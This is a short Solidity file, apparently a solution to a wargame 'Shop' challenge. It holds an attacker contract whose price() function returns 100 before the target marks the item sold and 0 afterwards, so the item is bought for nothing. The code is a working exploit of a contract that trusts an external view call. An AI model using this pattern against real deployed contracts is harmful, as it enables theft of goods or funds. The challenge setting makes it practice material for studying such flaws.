// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

abstract contract IShop { //Usamos un abstract contract en lugar de una interfaz para poder usar variables (isSold).
 bool public isSold;
  function buy() public virtual;
}

contract ShopAttacker {
  IShop public challenge;

  constructor(address challengeAddress) public {
    challenge = IShop(challengeAddress);
  }

  function atacar() public {
    challenge.buy();
  }

  function price() public view returns(uint) {
    if(challenge.isSold()){
      return 0;
    } else {
      return 100;
    }
  }
}